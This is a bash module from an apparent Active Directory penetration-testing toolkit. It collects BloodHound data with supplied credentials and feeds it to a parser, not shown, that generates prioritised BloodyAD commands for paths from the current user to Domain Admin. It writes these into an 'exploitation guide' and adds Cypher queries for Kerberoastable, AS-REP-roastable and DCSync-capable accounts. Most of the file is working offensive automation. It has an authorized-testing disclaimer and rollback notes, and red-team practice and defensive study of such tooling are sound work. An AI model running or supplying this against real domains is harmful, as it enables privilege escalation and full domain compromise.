#!/bin/bash
################################################################################
# MODULE: BloodHound Collection + Auto-Exploitation
# THE KILLER FEATURE: Automated BloodHound → BloodyAD command generation
################################################################################

run_bloodhound_collection() {
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║  PHASE 12: BloodHound + Auto-Exploitation                            ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Check if BloodHound is available
    if ! command -v bloodhound-python &>/dev/null; then
        log_warning "bloodhound-python not installed - skipping"
        log_info "Install: pip3 install bloodhound"
        return
    fi
    
    # Require username/password for BloodHound
    if [ "$AUTH_TYPE" != "userpass" ]; then
        log_warning "BloodHound requires username/password authentication - skipping"
        return
    fi
    
    log_action "Collecting BloodHound data (this may take several minutes)..."
    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
    
    cd bloodhound || { log_error "Cannot enter bloodhound dir"; return 1; }
    
    # Try to resolve DNS first
    log_info "Checking DNS resolution..."
    if ! host "$DNS_SERVER" &>/dev/null; then
        log_warning "DNS resolution may fail - BloodHound will fallback to NTLM (this is normal)"
    fi
    
    # Robust collection. bloodhound-python auto-selects the PDC and connects to
    # it BY NAME; if that name resolves to an unreachable IP (an alternate DC, an
    # IPv6/AAAA record, or split-horizon DNS) the LDAP bind times out even though
    # the operator-supplied DC is reachable - which is exactly how a run yields
    # zero attack paths. We therefore target the reachable DC explicitly with -dc
    # (its FQDN read from rootDSE), and add --dns-tcp for pivots where UDP/53 is
    # filtered. Set ADENUM_PIN_DC_HOSTS=1 to also pin that FQDN -> $DC_IP in
    # /etc/hosts for the run (root only; reversible, cleaned up below) when DNS
    # itself returns the wrong address.
    local dc_fqdn
    dc_fqdn=$(ldapsearch -x -H "ldap://$DC_IP" -s base -b "" dnsHostName 2>/dev/null \
        | awk 'tolower($1)=="dnshostname:"{print $2; exit}')

    local hosts_pinned=""
    if [ "${ADENUM_PIN_DC_HOSTS:-0}" = "1" ] && [ -n "$dc_fqdn" ] && [ "$(id -u)" = "0" ] \
       && ! grep -qiE "[[:space:]]${dc_fqdn}([[:space:]]|$)" /etc/hosts 2>/dev/null; then
        echo "$DC_IP $dc_fqdn" >> /etc/hosts && hosts_pinned="$dc_fqdn" \
            && log_info "Pinned $dc_fqdn -> $DC_IP in /etc/hosts for BloodHound (will clean up)"
    fi

    local -a bh_args=(-u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -ns "$DNS_SERVER" -c all --zip --dns-tcp)
    [ -n "$dc_fqdn" ] && bh_args+=(-dc "$dc_fqdn")
    bloodhound-python "${bh_args[@]}" 2>&1 | tee bloodhound_collection.log

    # Remove only the pin we added; leave any pre-existing entry untouched.
    if [ -n "$hosts_pinned" ]; then
        grep -v "^$DC_IP $hosts_pinned$" /etc/hosts > /etc/hosts.adenum.tmp 2>/dev/null \
            && cat /etc/hosts.adenum.tmp > /etc/hosts; rm -f /etc/hosts.adenum.tmp
    fi
    
    if ls *.zip 1> /dev/null 2>&1; then
        BH_ZIP=$(ls -t *.zip | head -1)
        log_success "BloodHound data collected → $BH_ZIP"
        SUCCESSFUL_CHECKS=$((SUCCESSFUL_CHECKS + 1))
        
        add_finding "INFO" "BloodHound" "Graph data collected: $BH_ZIP" \
            "Import into BloodHound GUI for analysis"
        
        # AUTO-EXPLOITATION: Parse BloodHound → Generate BloodyAD commands
        if [ "$PYTHON_AVAILABLE" = true ] && [ -f "$SCRIPT_DIR/modules/bloodhound_parser.py" ]; then
            log_action "🎯 ANALYZING ATTACK PATHS (Auto-Exploitation)..."
            echo ""
            
            python3 "$SCRIPT_DIR/modules/bloodhound_parser.py" "$BH_ZIP" "$DOMAIN" "$USERNAME" "$DC_IP" \
                > bloodyad_automation.json \
                2> bloodyad_automation.log
            local py_rc=$?

            if [ "$py_rc" -eq 0 ] && [ -s bloodyad_automation.json ]; then
                log_success "Attack path analysis complete!"
                
                # Extract and format commands
                local num_commands=$(jq '.exploitation_commands | length' bloodyad_automation.json 2>/dev/null || echo 0)
                
                if [ "$num_commands" -gt 0 ]; then
                    log_success "🎯 Generated $num_commands automated exploitation commands!"
                    echo ""
                    
                    # Create human-readable exploitation guide
                    cat > bloodyad_EXPLOITATION_GUIDE.txt << 'EOFGUIDE'
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  🎯 AUTOMATED EXPLOITATION GUIDE - BloodHound → BloodyAD 🎯         ║
║                                                                      ║
║  This file contains AUTOMATED attack paths from your current user   ║
║  to Domain Admin, with ready-to-use BloodyAD commands.              ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝

EOFGUIDE
                    
                    echo "" >> bloodyad_EXPLOITATION_GUIDE.txt
                    echo "Generated: $(date)" >> bloodyad_EXPLOITATION_GUIDE.txt
                    echo "Domain: $DOMAIN" >> bloodyad_EXPLOITATION_GUIDE.txt
                    echo "Your User: $USERNAME" >> bloodyad_EXPLOITATION_GUIDE.txt
                    echo "DC: $DC_IP" >> bloodyad_EXPLOITATION_GUIDE.txt
                    echo "" >> bloodyad_EXPLOITATION_GUIDE.txt
                    echo "═════════════════════════════════════════════════════════════════════" >> bloodyad_EXPLOITATION_GUIDE.txt
                    echo "" >> bloodyad_EXPLOITATION_GUIDE.txt
                    
                    # Parse and format each command
                    local cmd_num=0
                    while read -r cmd; do
                        cmd_num=$((cmd_num + 1))
                        
                        local priority=$(echo "$cmd" | jq -r '.priority')
                        local type=$(echo "$cmd" | jq -r '.type')
                        local description=$(echo "$cmd" | jq -r '.description')
                        local command=$(echo "$cmd" | jq -r '.command')
                        local impact=$(echo "$cmd" | jq -r '.impact')
                        local opsec=$(echo "$cmd" | jq -r '.opsec')
                        local prereqs=$(echo "$cmd" | jq -r '.prerequisites')
                        local follow_up=$(echo "$cmd" | jq -r '.follow_up // empty')
                        
                        cat >> bloodyad_EXPLOITATION_GUIDE.txt << EOF
[$priority - ATTACK #$cmd_num] $type
─────────────────────────────────────────────────────────────────────

Description: $description

Impact: $impact

Prerequisites: $prereqs

OpSec Level: $opsec

Command:
$command

EOF
                        if [ -n "$follow_up" ] && [ "$follow_up" != "null" ]; then
                            echo "Follow-up:" >> bloodyad_EXPLOITATION_GUIDE.txt
                            echo "$follow_up" >> bloodyad_EXPLOITATION_GUIDE.txt
                            echo "" >> bloodyad_EXPLOITATION_GUIDE.txt
                        fi
                        
                        echo "═════════════════════════════════════════════════════════════════════" >> bloodyad_EXPLOITATION_GUIDE.txt
                        echo "" >> bloodyad_EXPLOITATION_GUIDE.txt
                        
                        # Add findings based on priority
                        if [ "$priority" == "CRITICAL" ]; then
                            add_finding "CRITICAL" "Attack Path" "$description" "$command"
                        elif [ "$priority" == "HIGH" ]; then
                            add_finding "HIGH" "Attack Path" "$description" "$command"
                        fi
                        
                    done < <(jq -c '.exploitation_commands[]' bloodyad_automation.json)
                    
                    cat >> bloodyad_EXPLOITATION_GUIDE.txt << 'EOFEND'

╔══════════════════════════════════════════════════════════════════════╗
║  IMPORTANT NOTES                                                     ║
╚══════════════════════════════════════════════════════════════════════╝

1. Test commands in a safe environment first
2. Replace 'PASSWORD' with your actual password
3. Be aware of OpSec levels - critical findings generate alerts
4. Document all actions for your report
5. Have rollback commands ready before executing

ROLLBACK TEMPLATE:
If you added yourself to Domain Admins:
  net group "Domain Admins" USERNAME /delete /domain

If you reset a password:
  Document original password reset date
  Inform target user of temporary compromise

╔══════════════════════════════════════════════════════════════════════╗
║  This is for authorized security testing only!                       ║
╚══════════════════════════════════════════════════════════════════════╝
EOFEND
                    
                    log_success "📄 Exploitation guide created → bloodyad_EXPLOITATION_GUIDE.txt"
                    echo ""
                    log_info "Review the exploitation guide for ready-to-use commands!"
                    
                    # Show summary
                    local critical=$(jq '[.exploitation_commands[] | select(.priority=="CRITICAL")] | length' bloodyad_automation.json)
                    local high=$(jq '[.exploitation_commands[] | select(.priority=="HIGH")] | length' bloodyad_automation.json)
                    local medium=$(jq '[.exploitation_commands[] | select(.priority=="MEDIUM")] | length' bloodyad_automation.json)
                    
                    echo ""
                    log_success "Attack Path Summary:"
                    [ "$critical" -gt 0 ] && echo -e "  ${RED}CRITICAL:${NC} $critical paths (immediate Domain Admin)"
                    [ "$high" -gt 0 ] && echo -e "  ${YELLOW}HIGH:${NC}     $high paths (privilege escalation)"
                    [ "$medium" -gt 0 ] && echo -e "  ${BLUE}MEDIUM:${NC}   $medium paths (lateral movement)"
                    
                else
                    log_info "No direct attack paths found from your user"
                    log_info "Manual BloodHound analysis recommended"
                fi
            else
                log_warning "BloodHound parsing failed - manual analysis required"
            fi
        else
            log_info "Python or BloodHound parser not available - skipping auto-exploitation"
            log_info "You can manually analyze BloodHound data in the GUI"
        fi
        
        # Generate Cypher queries for manual analysis
        cat > bloodhound_cypher_queries.txt << 'EOFCYPHER'
╔══════════════════════════════════════════════════════════════════════╗
║  BLOODHOUND CYPHER QUERIES                                           ║
║  Run these in BloodHound GUI after importing the ZIP file            ║
╚══════════════════════════════════════════════════════════════════════╝

[1] Find Your Path to Domain Admin
───────────────────────────────────────────────────────────────────────
MATCH p=shortestPath((u:User {name:"YOUR_USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
RETURN p

[2] All Kerberoastable Users
───────────────────────────────────────────────────────────────────────
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames

[3] AS-REP Roastable Users
───────────────────────────────────────────────────────────────────────
MATCH (u:User {dontreqpreauth:true})
WHERE u.enabled=true
RETURN u.name

[4] Unconstrained Delegation Computers
───────────────────────────────────────────────────────────────────────
MATCH (c:Computer {unconstraineddelegation:true})
WHERE c.enabled=true
RETURN c.name

[5] Users with DCSync Rights
───────────────────────────────────────────────────────────────────────
MATCH p=(u:User)-[:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN p

[6] GenericAll on High Value Targets
───────────────────────────────────────────────────────────────────────
MATCH p=(u:User)-[:GenericAll]->(t)
WHERE t.highvalue=true
RETURN p

[7] WriteDacl on Domain
───────────────────────────────────────────────────────────────────────
MATCH p=(u:User)-[:WriteDacl]->(d:Domain)
RETURN p

[8] Shortest Path from Owned Users to Domain Admins
───────────────────────────────────────────────────────────────────────
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
RETURN p

[9] All Admin Groups
───────────────────────────────────────────────────────────────────────
MATCH (g:Group)
WHERE g.name CONTAINS "ADMIN"
RETURN g.name, g.description

[10] Computers with Unconstrained Delegation (Exploitable)
───────────────────────────────────────────────────────────────────────
MATCH (c:Computer {unconstraineddelegation:true})
WHERE c.enabled=true AND NOT c.name STARTS WITH 'DC'
RETURN c.name
EOFCYPHER
        
        log_success "Cypher queries created → bloodhound_cypher_queries.txt"
        
    else
        log_error "BloodHound collection failed (see bloodhound/bloodhound_collection.log)"
        log_warning "Common cause: bloodhound-python reached the DC by name, but that name resolved to an unreachable IP."
        log_info "Manual fix on the operator host, then feed the zip to the parser:"
        log_info "  echo '$DC_IP ${dc_fqdn:-<dc-fqdn>} $DOMAIN' | sudo tee -a /etc/hosts"
        log_info "  bloodhound-python -u $USERNAME -p '<password>' -d $DOMAIN -ns $DC_IP -c all --zip --dns-tcp${dc_fqdn:+ -dc $dc_fqdn}"
        log_info "  python3 $SCRIPT_DIR/modules/bloodhound_parser.py <zip> $DOMAIN $USERNAME $DC_IP"
        FAILED_CHECKS=$((FAILED_CHECKS + 1))
    fi

    cd .. || return
    echo ""
}
